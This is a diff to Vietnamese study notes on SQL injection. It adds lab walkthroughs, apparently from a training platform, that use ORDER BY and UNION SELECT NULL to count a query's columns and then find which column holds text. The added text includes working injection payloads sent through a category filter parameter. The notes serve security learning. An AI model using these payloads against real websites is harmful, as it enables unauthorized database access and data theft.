@@ -144,7 +144,7 @@ SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'
 
   ⇒ Dữ liệu bị ẩn đã bị lộ.
 
-  ### Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+### Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
 
 - Với cách thức như vậy, ta thử khai thác với website có các option danh mục như sau:
 
@@ -190,7 +190,7 @@ SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'
 
   &rarr; Kết quả --' sẽ làm mọi câu sau nó bị bỏ qua, phần *AND password = ''* bị vô hiệu hóa &rarr; Đăng nhập thành công dù không biết mật khẩu.
 
-  ### Lab: SQL injection vulnerability allowing login bypass
+### Lab: SQL injection vulnerability allowing login bypass
 
 - Với cách thức như vậy, ta thử khai thác một form login như sau:
 
@@ -260,7 +260,7 @@ SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'
 
 ---
 
-## 5. Xác định số lượng cột
+## 6. Xác định số lượng cột
 
 - Như đã nói ở mục trước, khi muốn sử dụng UNION SELECT để trích xuất dữ liệu từ bảng khác, thì số lượng cột trong truy vấn gốc và truy vấn bạn chèn vào phải bằng nhau.
 
@@ -317,6 +317,123 @@ SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'
   ```
 
   Nếu số lượng NULL không khớp số lượng cột ở câu truy vấn gốc, database có thể bảo lỗi hoặc ứng dụng sẽ trả lỗi HTTP.
+
+### Lab: SQL injection UNION attack, determining the number of columns returned by the query
+
+- Giao diện một trang web cho phép xem các sản phẩm:
+
+  <img width="1919" height="872" alt="image" src="https://github.com/user-attachments/assets/7255319c-0123-4031-b08f-c6a8c988885a" />
+
+  Request của trình duyệt khi ta chọn một category là Food & Drink:
+
+  <img width="1400" height="806" alt="image" src="https://github.com/user-attachments/assets/1f854e05-f498-4efc-9c46-cff0a7d26ef8" />
+
+  Thực hiện gửi request vào Repeater sau đó sửa tham số category lần lượt như:
+
+  ```url
+  GET /filter?category=Food+%26+Drink' ORDER BY 3 --
+  GET /filter?category=Food+%26+Drink' ORDER BY 4 --
+  ```
+
+  Kết quả khi *ORDER BY 3* vẫn hợp lệ:
+
+  <img width="1869" height="751" alt="image" src="https://github.com/user-attachments/assets/4371588f-27de-479f-a0be-7486f734dbc9" />
+
+  Tuy nhiên với *ORDER BY 4* kết quả trả về là internal server error:
+
+  <img width="1870" height="745" alt="image" src="https://github.com/user-attachments/assets/e012d860-bf25-49e2-80e8-0f076824355a" />
+
+  &rarr; Kết luận câu truy vấn gốc có 3 cột.
+
+  Câu truy vấn lúc này sẽ trở thành:
+
+  ```sql
+  SELECT a, b, c FROM products WHERE category='Food & Drink' ORDER BY 4 -- 
+  ```
+
+  và sẽ xảy ra lỗi khi 4 vượt quá lượng cột chỉ định.
+
+- Với cách sử dụng UNION SELECT NULL:
+
+  Tạo payload với số lượng hai null:
+
+  <img width="1869" height="745" alt="image" src="https://github.com/user-attachments/assets/d65ea8dc-5e60-4d02-9d1f-0f4cf4426096" />
+
+  &rarr; Kết quả báo lỗi.
+
+  Tạo payload với số lượng ba null thì hợp lệ:
+
+  <img width="1866" height="753" alt="image" src="https://github.com/user-attachments/assets/11ccad0e-be95-444f-864e-2c30964c318b" />
+
+  Vì lúc này câu truy vấn union sẽ đủ điều kiện hợp với ba cột:
+
+   ```sql
+  SELECT a, b, c FROM products WHERE category='Food & Drink' UNION SELECT NULL, NULL, NULL -- 
+  ```
+
+**Note**: Đối với DBMS như Oracle, nó yêu cầu mọi truy vấn SELECT phải có mệnh đề FROM. Do đó mà có bảng hệ thống đặc biệt tên là DUAL – một bảng chỉ có 1 dòng, 1 cột, dùng để “giả lập” truy vấn. ví dụ: ***' UNION SELECT NULL FROM DUAL--***
+
+---
+
+## 7. Tìm ra cột có kiểu dữ liệu phù hợp
+
+- Khi thực hiện tấn công kiểu *UNINON SELECT* , nếu cột nào không tương thích kiểu dữ liệu (ví dụ kiểu int) sẽ gây lỗi khi bạn cố gán chuỗi vào nó.
+
+- Do đó giả sử đã biết truy vấn gốc có 4 cột, ta chèn lần lượt thử chuỗi bất kỳ 'any' vào từng vị trí để xem phản hồi của server.
+
+  ```sql
+  ' UNION SELECT 'any', NULL, NULL, NULL--  
+  ' UNION SELECT NULL, 'any', NULL, NULL--  
+  ' UNION SELECT NULL, NULL, 'any', NULL--  
+  ' UNION SELECT NULL, NULL, NULL, 'any'--
+  ```
+
+  Nếu server trả lỗi: "Conversion failed when converting the varchar value 'any' to data type int" &rarr; Cột đó không tương thích với kiểu chuỗi, bỏ qua.
+
+  Nếu server không báo lỗi &rarr; Đó là cột có kiểu string và đang được in ra.
+
+### Lab: SQL injection UNION attack, finding a column containing text
+
+- Giao diện trang web thực hiện khai thác:
+
+  <img width="1875" height="885" alt="image" src="https://github.com/user-attachments/assets/81915abe-8af3-4608-846e-dd9e865a942e" />
+
+  Tương tự bắt request category vào trong Repeater để xác định số lượng cột trong truy vấn gốc.
+
+  Ta thấy với *ORDER BY 4* server trả về lỗi &rarr; câu truy vấn gốc có 3 cột.
+
+  <img width="1872" height="811" alt="image" src="https://github.com/user-attachments/assets/20173be6-7742-43e9-8ac6-04b3d1da04ad" />
+
+  Tạo các payload:
+
+  ```sql
+  ' UNION SELECT '8Dx9Oj', NULL, NULL--  
+  ' UNION SELECT NULL, '8Dx9Oj', NULL--  
+  ' UNION SELECT NULL, NULL, '8Dx9Oj'--  
+  ```
+
+  Ta thấy với: *' UNION SELECT NULL, '8Dx9Oj', NULL--* kết quả trả về hợp lệ &rarr; cột thứ hai có kiểu dữ liệu chuỗi.
+
+  <img width="1866" height="746" alt="image" src="https://github.com/user-attachments/assets/d8df1350-260f-4a24-b65b-833e74b82832" />
+
+  Lúc này câu truy vấn sẽ là:
+
+  ```sql
+  SELECT a, b, c FROM products WHERE category='Gifts' UNION SELECT NULL, '8Dx9Oj', NULL --
+  ```
+
+  Do cột *b* có dữ liệu string nên hợp lệ với kết quả hợp '8Dx9Oj'.
+  
+
+
+
+
+  
+  
+  
+
+
+
   
 
 
